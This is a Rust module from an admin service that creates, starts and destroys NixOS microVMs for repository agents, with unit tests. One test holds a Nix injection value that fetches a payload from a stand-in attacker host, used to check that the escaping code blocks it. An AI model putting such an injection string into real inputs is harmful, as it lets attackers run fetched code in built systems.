use crate::config::Settings;
use crate::error::{ApiError, ApiResult};
use std::path::{Component, Path};
use tokio::io::AsyncWriteExt;
use tokio::process::Command;

/// Subdirectories that live under each VM's persistent volume. The Nix side
/// (lib/repo-vm.nix) bind-mounts these into ~/.claude/* and ~/.ssh; keep the
/// two lists in lockstep.
pub const PERSISTENT_SUBDIRS: &[&str] = &["projects", "todos", "statsig", "ssh", "work"];

/// Encode the last octet of an IP into the trailing byte of a deterministic MAC.
/// Locally-administered unicast prefix `02:00:00:00:00:XX` is fine within a /24;
/// if we ever add a second bridge, hash the full IP instead.
pub fn mac_from_ip(ip: &str) -> String {
    let last = ip
        .rsplit('.')
        .next()
        .and_then(|s| s.parse::<u8>().ok())
        .unwrap_or(0);
    format!("02:00:00:00:00:{:02x}", last)
}

fn nix_str(s: &str) -> String {
    // Serialize a Rust &str as a Nix string literal. Reusing JSON quoting works
    // because Nix accepts the same backslash escapes plus we explicitly handle
    // ${ (Nix antiquotation) by inserting a backslash. Without this guard, a
    // repo URL containing ${ would inject arbitrary Nix into the VM flake.
    let json = serde_json::to_string(s).unwrap_or_else(|_| "\"\"".into());
    json.replace("${", "\\${")
}

pub async fn write_vm_flake(
    settings: &Settings,
    name: &str,
    repo_url: &str,
    branch: &str,
    vm_ip: &str,
    vm_mac: &str,
    vcpu: i64,
    mem_mb: i64,
    permission_mode: &str,
) -> ApiResult<()> {
    let dir = settings.vm_flake_dir(name);
    // Nuke and recreate so a stale flake.lock from a prior create can't
    // pin the lagrange input to an old commit. microvm CLI generates a
    // fresh lock from flake.nix on first eval.
    match tokio::fs::remove_dir_all(&dir).await {
        Ok(_) => {}
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        Err(e) => return Err(ApiError::Io(e)),
    }
    tokio::fs::create_dir_all(&dir).await?;

    let flake = format!(
        r#"{{
  description = "lagrange repo-VM: {name}";

  inputs.lagrange.url = {flake_ref};

  outputs = {{ lagrange, ... }}: {{
    nixosConfigurations.{name} = lagrange.lib.mkRepoVm {{
      name = {name_lit};
      repoUrl = {repo_url};
      branch = {branch};
      vmIp = {vm_ip};
      vmMac = {vm_mac};
      vcpu = {vcpu};
      memMb = {mem_mb};
      permissionMode = {permission_mode};
    }};
  }};
}}
"#,
        name = name,
        flake_ref = nix_str(&settings.flake_ref),
        name_lit = nix_str(name),
        repo_url = nix_str(repo_url),
        branch = nix_str(branch),
        vm_ip = nix_str(vm_ip),
        vm_mac = nix_str(vm_mac),
        vcpu = vcpu,
        mem_mb = mem_mb,
        permission_mode = nix_str(permission_mode),
    );

    let path = dir.join("flake.nix");
    let mut f = tokio::fs::File::create(&path).await?;
    f.write_all(flake.as_bytes()).await?;
    f.sync_all().await?;
    Ok(())
}

/// Rewrite a github URL to https + PAT-auth form. Returns None for
/// non-github URLs so the caller can fall back to SSH (or whatever
/// the operator pasted).
///
/// `x-access-token` is GitHub's documented basic-auth username for
/// fine-grained PATs; the password is the token itself.
fn github_https_with_token(url: &str, token: &str) -> Option<String> {
    let trimmed = url.trim_end_matches(".git");
    let path = if let Some(rest) = trimmed.strip_prefix("git@github.com:") {
        rest
    } else if let Some(rest) = trimmed.strip_prefix("ssh://git@github.com/") {
        rest
    } else if let Some(rest) = trimmed.strip_prefix("https://github.com/") {
        rest
    } else {
        return None;
    };
    Some(format!(
        "https://x-access-token:{}@github.com/{}.git",
        token, path
    ))
}

/// Replace credentials in any URL-shaped substring of `s` so secrets
/// don't leak into logs / API error bodies. Git tends to echo the
/// remote URL back in its error messages, so we sanitize unconditionally.
fn redact_url_secrets(s: &str) -> String {
    // Match `https://user:pass@host…` and blank out the colon-separated
    // pair. Tolerant of any non-`@`/non-`/` characters in user/pass.
    let re = regex::Regex::new(r"(https?://)[^/@\s]+:[^@\s]+@").unwrap();
    re.replace_all(s, "${1}***:***@").into_owned()
}

pub async fn validate_repo_reachable(
    settings: &Settings,
    repo_url: &str,
    branch: &str,
    name: &str,
    github_token: Option<&str>,
) -> ApiResult<()> {
    // Prefer HTTPS+PAT for github URLs when we have a token — it
    // sidesteps SSH host-key + key-permission concerns entirely. SSH
    // is the fallback for non-github remotes or when no PAT is
    // assigned to this VM.
    let (effective_url, ssh_needed) = match github_token.and_then(|t| github_https_with_token(repo_url, t)) {
        Some(https) => (https, false),
        None => (repo_url.to_string(), true),
    };

    let mut cmd = Command::new("git");
    if ssh_needed {
        let deploy_key = settings.deploy_key_path(name);
        // StrictHostKeyChecking=accept-new on BOTH branches — previous
        // bug was that the no-deploy-key path left this off, so the
        // first git ls-remote to any host failed with "Host key
        // verification failed" until someone ssh'd from the
        // lagrange-admin account once.
        if deploy_key.exists() {
            cmd.env(
                "GIT_SSH_COMMAND",
                format!(
                    "ssh -i {} -o StrictHostKeyChecking=accept-new -o BatchMode=yes",
                    deploy_key.display()
                ),
            );
        } else {
            cmd.env(
                "GIT_SSH_COMMAND",
                "ssh -o StrictHostKeyChecking=accept-new -o BatchMode=yes",
            );
        }
    } else {
        // Prevent git from prompting for credentials when the PAT is
        // wrong — fail loudly instead of hanging waiting on a tty.
        cmd.env("GIT_TERMINAL_PROMPT", "0");
    }
    let out = cmd
        .arg("ls-remote")
        .arg("--heads")
        .arg(&effective_url)
        .arg(branch)
        .output()
        .await
        .map_err(|e| ApiError::Subprocess(format!("spawning git: {e}")))?;

    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Err(ApiError::BadRequest(format!(
            "git ls-remote failed: {}",
            redact_url_secrets(stderr.trim())
        )));
    }
    if out.stdout.is_empty() {
        return Err(ApiError::BadRequest(format!(
            "branch {} not found on {}",
            branch, repo_url
        )));
    }
    Ok(())
}

pub async fn provision_persistent_volume(settings: &Settings, name: &str) -> ApiResult<()> {
    let root = settings.agent_state_dir(name);
    for sub in PERSISTENT_SUBDIRS {
        tokio::fs::create_dir_all(root.join(sub)).await?;
    }
    let gc = root.join("gitconfig");
    if !gc.exists() {
        tokio::fs::write(&gc, "").await?;
    }
    let src_key = settings.deploy_key_path(name);
    if src_key.exists() {
        let dst = root.join("ssh").join("id_ed25519");
        tokio::fs::copy(&src_key, &dst).await?;
        use std::os::unix::fs::PermissionsExt;
        let mut perms = tokio::fs::metadata(&dst).await?.permissions();
        perms.set_mode(0o600);
        tokio::fs::set_permissions(&dst, perms).await?;
    }
    // Full-scope Claude session needed by Remote Control. No-op when the
    // operator hasn't run `claude auth login` and POSTed the result yet.
    crate::credentials::stage_for_vm(settings, name).await?;
    // GitHub PAT staging is per-account now; the admin API restages from
    // the assigned account when (a) a VM is created, (b) the assigned
    // account's token is updated, or (c) the VM is reassigned. The
    // provisioning path here doesn't know the alias — callers thread it
    // in via stage_github_for_vm below.
    Ok(())
}

/// Write the per-VM gh.env using the token for `account` (or remove the
/// file if `account` is None or has no staged token).
pub async fn stage_github_for_vm(
    settings: &Settings,
    name: &str,
    account: Option<&str>,
) -> ApiResult<()> {
    let env_path = settings.agent_state_dir(name).join("gh.env");
    let token = match account {
        Some(alias) => crate::github_accounts::read_token(settings, alias).await?,
        None => None,
    };
    match token {
        Some(tok) => {
            let body = format!("GITHUB_TOKEN={tok}\nGH_TOKEN={tok}\n");
            tokio::fs::create_dir_all(
                env_path
                    .parent()
                    .ok_or_else(|| ApiError::Other(anyhow::anyhow!("env path has no parent")))?,
            )
            .await?;
            // Same group-readable shape as the credentials file so the
            // guest agent (gid 100 / users) can read at 0640.
            use std::os::unix::fs::OpenOptionsExt;
            use std::io::Write;
            let env_clone = env_path.clone();
            tokio::task::spawn_blocking(move || -> std::io::Result<()> {
                let mut f = std::fs::OpenOptions::new()
                    .write(true)
                    .create(true)
                    .truncate(true)
                    .mode(0o640)
                    .open(&env_clone)?;
                f.write_all(body.as_bytes())?;
                std::os::unix::fs::chown(&env_clone, None, Some(100))?;
                Ok(())
            })
            .await
            .map_err(|e| ApiError::Other(anyhow::anyhow!("join: {e}")))??;
        }
        None => match tokio::fs::remove_file(&env_path).await {
            Ok(_) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => return Err(ApiError::Io(e)),
        },
    }
    Ok(())
}

pub async fn microvm_create_and_start(settings: &Settings, name: &str) -> ApiResult<()> {
    let flake_path = settings.vm_flake_dir(name);
    // -c gives the VM name; -f takes the flake URI WITHOUT an attribute
    // fragment. The CLI builds the full attr path
    // (`#nixosConfigurations.<name>.config.microvm.declaredRunner`) itself —
    // passing `<path>#<name>` here gave Nix a malformed attr with a stray
    // `#` in the middle.
    let flake_ref = flake_path.display().to_string();

    run_cmd("microvm", &["-c", name, "-f", &flake_ref]).await?;
    // NOTE: do NOT call `systemctl enable microvm@<name>` here.
    //   1. polkit doesn't pass a `unit` detail for EnableUnitFiles, so our
    //      rule that scopes manage-unit-files to microvm@* can't match,
    //      and the call dies with "interactive authentication required"
    //   2. enable on NixOS writes into /etc/systemd/system/...wants/,
    //      which the next comin activation rewrites — so persistence
    //      wouldn't survive a reconcile anyway
    // The autostart property is provided instead by reconcile_autostart()
    // running in the admin service at startup: it walks the DB and
    // systemctl-starts every VM whose recorded status is "running" but
    // whose runtime isn't active. systemctl start uses manage-units,
    // which our existing polkit rule does cover.
    run_cmd("systemctl", &["start", &format!("microvm@{}", name)]).await?;
    Ok(())
}

pub async fn microvm_stop(name: &str) -> ApiResult<()> {
    run_cmd("systemctl", &["stop", &format!("microvm@{}", name)]).await
}

pub async fn microvm_restart(name: &str) -> ApiResult<()> {
    run_cmd("systemctl", &["restart", &format!("microvm@{}", name)]).await
}

pub async fn microvm_status(name: &str) -> ApiResult<String> {
    let out = Command::new("systemctl")
        .arg("is-active")
        .arg(format!("microvm@{}", name))
        .output()
        .await
        .map_err(|e| ApiError::Subprocess(format!("spawn systemctl: {e}")))?;
    Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

pub async fn microvm_destroy(settings: &Settings, name: &str) -> ApiResult<()> {
    let _ = microvm_stop(name).await;
    // No `systemctl disable` — see comment in microvm_create_and_start.
    // microvm -d removes the per-VM dir; without an enable symlink there's
    // nothing for systemd to garbage-collect.
    //
    // We capture but don't propagate `microvm -d`'s exit code yet — the
    // empirical failure mode is: a half-built /var/lib/microvms/<name>
    // (from a create that didn't reach systemctl start) leaves no
    // unit registered, `microvm -d` errors, and the dir is then
    // orphaned. The next `microvm -c <name>` refuses to overwrite it
    // and the operator is stuck.
    //
    // Fall back to a direct rm -rf of the per-VM dir. The lagrange-admin
    // service has CAP_DAC_OVERRIDE bounded to its ReadWritePaths so it
    // can unlink the root-owned virtiofsd sockets / pidfiles left
    // behind by past runs.
    let cli_result = run_cmd("microvm", &["-d", name]).await;

    let dir = settings.microvm_dir.join(name);
    if dir.exists() {
        if let Err(e) = tokio::fs::remove_dir_all(&dir).await {
            tracing::error!(
                vm = %name,
                dir = %dir.display(),
                error = %e,
                "microvm_destroy: fallback rm -rf failed; manual cleanup required"
            );
            return Err(ApiError::Io(e));
        } else if cli_result.is_err() {
            tracing::warn!(
                vm = %name,
                dir = %dir.display(),
                "microvm_destroy: `microvm -d` errored but fallback rm -rf succeeded"
            );
        }
    }

    // `microvm -d`'s exit code is now informational — if rm cleaned up
    // we're effectively destroyed. Swallow the CLI error so the
    // happy-path caller (destroy_repo in api.rs) doesn't log a noisy
    // warning when the recovery worked.
    Ok(())
}

pub async fn vm_journal_tail(name: &str, lines: u32) -> ApiResult<String> {
    // lagrange-admin is in the systemd-journal group, so `journalctl -u` for
    // system units works without sudo.
    let out = Command::new("journalctl")
        .args([
            "-u",
            &format!("microvm@{}", name),
            "-n",
            &lines.to_string(),
            "--no-pager",
        ])
        .output()
        .await
        .map_err(|e| ApiError::Subprocess(format!("spawn journalctl: {e}")))?;
    if !out.status.success() {
        return Err(ApiError::Subprocess(format!(
            "journalctl failed (exit {}): {}",
            out.status.code().unwrap_or(-1),
            String::from_utf8_lossy(&out.stderr).trim()
        )));
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// At admin-service startup, bring every VM with status='running' back
/// to actually-running. Survives host reboots without needing
/// `systemctl enable` per instance (which polkit rejects for our
/// service user, and which NixOS would clobber on the next activation
/// anyway).
///
/// Skips:
///   - VMs whose status isn't 'running' (operator explicitly stopped)
///   - VMs whose runtime is already active
///   - VMs whose /var/lib/microvms/<name> dir doesn't exist (the unit
///     would fail to start with no useful information; the operator
///     should rebuild it via POST /v1/repos/<name>/start which
///     re-runs `microvm -c` if needed)
pub async fn reconcile_autostart(pool: &sqlx::SqlitePool, settings: &Settings) {
    let vms = match crate::db::list_vms(pool).await {
        Ok(v) => v,
        Err(e) => {
            tracing::error!(error = ?e, "autostart: list_vms failed");
            return;
        }
    };
    let mut started = 0u32;
    let mut skipped = 0u32;
    for vm in vms {
        if vm.status != "running" {
            skipped += 1;
            continue;
        }
        let active = microvm_status(&vm.name).await.unwrap_or_default() == "active";
        if active {
            skipped += 1;
            continue;
        }
        let dir = settings.microvm_dir.join(&vm.name);
        if !dir.exists() {
            tracing::warn!(
                vm = %vm.name,
                "autostart: /var/lib/microvms/<name> missing; skipping (operator must redeploy)"
            );
            skipped += 1;
            continue;
        }
        tracing::info!(vm = %vm.name, "autostart: starting");
        if let Err(e) = run_cmd("systemctl", &["start", &format!("microvm@{}", vm.name)]).await {
            tracing::error!(vm = %vm.name, error = %e, "autostart: start failed");
        } else {
            started += 1;
        }
    }
    tracing::info!(started, skipped, "autostart reconcile complete");
}

/// Tail of a byte buffer interpreted as UTF-8, capped to ~`max` chars.
/// `nix` errors land at the END of the build log, but the log can be
/// hundreds of KB — without a tail we either drown the operator in
/// progress noise or (worse) overflow the API response body.
fn tail_lossy(bytes: &[u8], max: usize) -> String {
    let s = String::from_utf8_lossy(bytes);
    let trimmed = s.trim_end();
    if trimmed.chars().count() <= max {
        return trimmed.to_string();
    }
    // Take the last `max` chars (not bytes — UTF-8 safe).
    let start = trimmed.chars().count().saturating_sub(max);
    let suffix: String = trimmed.chars().skip(start).collect();
    format!("…{}", suffix)
}

/// Run a privileged-on-host command directly. systemctl actions on
/// microvm@*.service are gated by a polkit rule that allows the microvm
/// group; `microvm -c/-d` only needs group write on /var/lib/microvms. No
/// setuid involved — NoNewPrivileges stays on.
///
/// Errors include the tail of BOTH stdout and stderr because `nix`
/// (which `microvm -c` invokes) sometimes routes the real failure
/// message to stdout while leaving progress chatter on stderr — the
/// previous stderr-only error reporter left operators staring at a
/// build-progress line that looked successful but exited 1.
async fn run_cmd(cmd: &str, args: &[&str]) -> ApiResult<()> {
    let out = Command::new(cmd)
        .args(args)
        .output()
        .await
        .map_err(|e| ApiError::Subprocess(format!("spawn {cmd}: {e}")))?;
    if !out.status.success() {
        let code = out.status.code().unwrap_or(-1);
        let stderr_tail = tail_lossy(&out.stderr, 2000);
        let stdout_tail = tail_lossy(&out.stdout, 2000);
        // Log the full output server-side for journalctl forensics; the
        // API response gets the trimmed tails.
        tracing::error!(
            cmd = cmd,
            args = ?args,
            exit = code,
            stderr_len = out.stderr.len(),
            stdout_len = out.stdout.len(),
            stderr = %String::from_utf8_lossy(&out.stderr),
            stdout = %String::from_utf8_lossy(&out.stdout),
            "subprocess failed"
        );
        let detail = if stdout_tail.is_empty() {
            format!("stderr: {stderr_tail}")
        } else {
            format!("stderr: {stderr_tail}\n\nstdout: {stdout_tail}")
        };
        return Err(ApiError::Subprocess(format!(
            "{} {:?} exit {}:\n{}",
            cmd, args, code, detail
        )));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mac_from_ip_encodes_last_octet() {
        assert_eq!(mac_from_ip("10.42.0.10"), "02:00:00:00:00:0a");
        assert_eq!(mac_from_ip("10.42.0.255"), "02:00:00:00:00:ff");
    }

    #[test]
    fn mac_from_ip_handles_malformed() {
        assert_eq!(mac_from_ip("not-an-ip"), "02:00:00:00:00:00");
    }

    #[test]
    fn nix_str_quotes_simple_strings() {
        assert_eq!(nix_str("hello"), "\"hello\"");
    }

    #[test]
    fn nix_str_escapes_antiquotation() {
        // Without escaping, a value containing ${ would be interpreted as
        // Nix antiquotation and could inject arbitrary expressions into
        // the generated VM flake. Verify every ${ is preceded by a backslash.
        let evil = "${builtins.fetchurl \"http://attacker/payload\"}";
        let out = nix_str(evil);
        assert!(out.contains("\\${"), "expected escaped antiquotation in {out:?}");
        let with_escapes_removed = out.replace("\\${", "");
        assert!(
            !with_escapes_removed.contains("${"),
            "unescaped ${{ in output: {out:?}"
        );
    }

    #[test]
    fn nix_str_escapes_quotes_and_backslashes() {
        let out = nix_str("a\"b\\c");
        assert_eq!(out, "\"a\\\"b\\\\c\"");
    }

    #[test]
    fn github_https_with_token_handles_ssh_form() {
        let got = github_https_with_token("git@github.com:foo/bar.git", "abc").unwrap();
        assert_eq!(got, "https://x-access-token:abc@github.com/foo/bar.git");
    }

    #[test]
    fn github_https_with_token_handles_https_form() {
        let got = github_https_with_token("https://github.com/foo/bar.git", "abc").unwrap();
        assert_eq!(got, "https://x-access-token:abc@github.com/foo/bar.git");
    }

    #[test]
    fn github_https_with_token_handles_no_dotgit_suffix() {
        let got = github_https_with_token("https://github.com/foo/bar", "abc").unwrap();
        assert_eq!(got, "https://x-access-token:abc@github.com/foo/bar.git");
    }

    #[test]
    fn github_https_with_token_rejects_other_hosts() {
        // We only convert github URLs; other forges drop through to the
        // SSH path so the operator's existing setup keeps working.
        assert!(github_https_with_token("git@gitlab.com:foo/bar.git", "abc").is_none());
        assert!(github_https_with_token("https://bitbucket.org/foo/bar.git", "abc").is_none());
        assert!(github_https_with_token("not-a-url", "abc").is_none());
    }

    #[test]
    fn redact_url_secrets_strips_basic_auth_from_https() {
        let line = "fatal: unable to access 'https://x-access-token:ghp_REAL@github.com/foo/bar.git/'";
        let out = redact_url_secrets(line);
        assert!(!out.contains("ghp_REAL"), "token leaked: {out}");
        assert!(out.contains("***:***@"), "expected redaction marker in {out}");
    }

    #[test]
    fn redact_url_secrets_leaves_clean_urls_alone() {
        let line = "fatal: repository 'https://github.com/foo/bar.git' not found";
        assert_eq!(redact_url_secrets(line), line);
    }
}

/// Delete the per-repo persistent volume. Refuses to follow symlinks at the
/// volume root and refuses any path that escapes `agent_state_root` via `..`.
pub async fn wipe_persistent_volume(settings: &Settings, name: &str) -> ApiResult<()> {
    for c in Path::new(name).components() {
        if !matches!(c, Component::Normal(_)) {
            return Err(ApiError::BadRequest(format!("invalid vm name {name}")));
        }
    }
    let target = settings.agent_state_dir(name);
    if !target.exists() {
        return Ok(());
    }
    // symlink_metadata does NOT follow symlinks; if the entry is a symlink we
    // refuse rather than delete what it points at.
    let md = tokio::fs::symlink_metadata(&target).await?;
    if md.file_type().is_symlink() {
        return Err(ApiError::BadRequest(format!(
            "{} is a symlink; refusing to delete",
            target.display()
        )));
    }
    tokio::fs::remove_dir_all(&target).await?;
    Ok(())
}
